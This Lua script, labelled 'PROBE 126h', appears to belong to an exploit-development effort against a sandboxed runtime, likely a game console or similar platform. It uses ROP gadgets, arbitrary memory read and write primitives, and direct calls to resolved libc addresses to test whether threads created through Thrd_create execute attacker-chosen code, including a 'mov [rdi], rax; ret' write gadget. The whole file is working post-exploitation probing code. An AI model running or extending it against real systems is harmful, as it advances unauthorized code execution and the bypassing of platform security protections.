-- CRASH_CLASS: MODERATE
-- PROBE 126h: Verify Thrd_create thread actually EXECUTES
-- Use "mov [rdi], rax; ret" gadget as thread function
-- arg = shared memory address → thread writes rax value to it

print("=== PROBE 126h: THREAD EXECUTION VERIFY ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Section A: Find the mov [rdi], rax; ret gadget
print("--- SECTION A: FIND GADGETS ---")
local write_gadget = nil
for k, v in pairs(gadgets) do
    if type(k) == "string" then
        print("  gadget[\"" .. k .. "\"] = " .. tostring(v))
        if k:find("mov %[rdi%], rax") then
            write_gadget = v
            print("  *** WRITE GADGET FOUND ***")
        end
    end
end

if not write_gadget then
    print("No write gadget in named gadgets, checking all keys...")
    -- Try to find it by value - the ropchain uses it
    -- From ropchain source: gadgets["mov [rdi], rax; ret"]
    write_gadget = gadgets["mov [rdi], rax; ret"]
    if write_gadget then
        print("Found via exact key: " .. tostring(write_gadget))
    end
end

-- Section B: Thrd_create with memcpy as a test
print("")
print("--- SECTION B: THRD_CREATE WITH MEMCPY ---")
local shared_b = memory.alloc(64)
memory.write_qword(shared_b, uint64(0xDEADDEAD))

-- Set up a struct: {dst_ptr, src_ptr, size} that memcpy will read
-- Actually memcpy(rdi, rsi, rdx) where rdi=arg from Thrd_create
-- rsi and rdx are uncontrolled... this will crash the thread
-- But we can use it to test if the thread even starts

-- Better: use a function that just stores something
-- Atomic_fetch_add_8(ptr, val): atomically adds val to *ptr
-- This takes 2 args (rdi, rsi). With Thrd_create, rdi=arg, rsi=undefined
-- Actually, atomic_fetch_add_8 is: long atomic_fetch_add_8(long *ptr, long val)
-- rdi = ptr (our shared), rsi = val (whatever is on the stack)

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)
local thrd_exit_fn = fcall(libc_addrofs.Thrd_exit)

-- Try with write gadget if found
if write_gadget then
    print("Using write gadget: " .. tostring(write_gadget))
    local shared_c = memory.alloc(64)
    memory.write_qword(shared_c, 0)

    local thr_buf = memory.alloc(8)
    memory.write_qword(thr_buf, 0)

    local ok, ret = pcall(thrd_create_fn, thr_buf, write_gadget, shared_c)
    print("Thrd_create(write_gadget, shared): ok=" .. tostring(ok) .. " ret=" .. tostring(ret))

    if ok then
        print("  ret_numeric=" .. to_num(ret))
        local thr_id = memory.read_qword(thr_buf)
        print("  thr_id=" .. tostring(thr_id))

        -- Wait for thread
        sleep(0.2, 's')

        -- Join thread
        local join_ok, join_ret = pcall(thrd_join_fn, thr_id, uint64(0))
        print("  Thrd_join: ok=" .. tostring(join_ok) .. " ret=" .. tostring(join_ret))

        local s_val = memory.read_qword(shared_c)
        local h, l = get_hi_lo(s_val)
        print(string.format("  shared=0x%08X%08X", h, l))
        if h ~= 0 or l ~= 0 then
            print("  *** THREAD EXECUTED AND WROTE TO MEMORY! ***")
        end
    end
end

-- Section C: Try with Atomic_fetch_add_8
print("")
print("--- SECTION C: ATOMIC_FETCH_ADD ---")
do
    local shared_d = memory.alloc(64)
    memory.write_qword(shared_d, uint64(0x1000))  -- initial value

    local thr_buf = memory.alloc(8)
    memory.write_qword(thr_buf, 0)

    -- Atomic_fetch_add_8(ptr, val): ptr=shared_d, val=whatever rsi is
    local ok, ret = pcall(thrd_create_fn, thr_buf, libc_addrofs.Atomic_fetch_add_8, shared_d)
    print("Thrd_create(atomic_add, shared): ok=" .. tostring(ok) .. " ret=" .. tostring(ret))

    if ok and to_num(ret) == 0 then
        sleep(0.2, 's')
        local thr_id = memory.read_qword(thr_buf)
        pcall(thrd_join_fn, thr_id, uint64(0))

        local after = memory.read_qword(shared_d)
        local h, l = get_hi_lo(after)
        print(string.format("  shared after=0x%08X%08X (was 0x1000)", h, l))
        if h ~= 0 or l ~= 0x1000 then
            print("  *** VALUE CHANGED! THREAD EXECUTED! ***")
        end
    end
end

-- Section D: Try creating a thread that sleeps
print("")
print("--- SECTION D: THREAD WITH NANOSLEEP ---")
do
    -- Can't use nanosleep as thread func directly (takes timespec ptr, not void*)
    -- But gettimeofday takes (tv, tz) where rdi=tv — similar to void*
    -- gettimeofday will write current time to the address in rdi

    local shared_e = memory.alloc(64)
    memory.write_qword(shared_e, 0)
    memory.write_qword(shared_e + 8, 0)

    local thr_buf = memory.alloc(8)
    memory.write_qword(thr_buf, 0)

    -- gettimeofday_import is at libc_addrofs.gettimeofday_import
    -- But it's a pointer to the actual function (import table)
    -- The actual gettimeofday entry point needs to be resolved

    -- Try calloc(0, 0) — safe, returns ptr or NULL, rdi=0 (num), rsi=undefined
    local ok, ret = pcall(thrd_create_fn, thr_buf, libc_addrofs.calloc, uint64(0))
    print("Thrd_create(calloc, 0): ok=" .. tostring(ok) .. " ret=" .. tostring(ret))

    if ok and to_num(ret) == 0 then
        sleep(0.2, 's')
        local thr_id = memory.read_qword(thr_buf)
        local join_ok, join_ret = pcall(thrd_join_fn, thr_id, uint64(0))
        print("  Thrd_join: ok=" .. tostring(join_ok) .. " ret=" .. tostring(join_ret))
    end
end

-- Section E: Create multiple threads to see if they all work
print("")
print("--- SECTION E: MULTI-THREAD ---")
local threads = {}
for i = 1, 5 do
    local thr_buf = memory.alloc(8)
    memory.write_qword(thr_buf, 0)

    local ok, ret = pcall(thrd_create_fn, thr_buf, gadgets.ret, uint64(i))
    if ok and to_num(ret) == 0 then
        threads[#threads + 1] = memory.read_qword(thr_buf)
        print("  thread " .. i .. ": id=" .. tostring(memory.read_qword(thr_buf)))
    else
        print("  thread " .. i .. ": FAILED ret=" .. tostring(ret))
    end
end
print("created " .. #threads .. " threads")

-- Join all
sleep(0.2, 's')
for i, thr_id in ipairs(threads) do
    pcall(thrd_join_fn, thr_id, uint64(0))
end

-- Canary
print("canary: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

print("=== PROBE 126h COMPLETE ===")
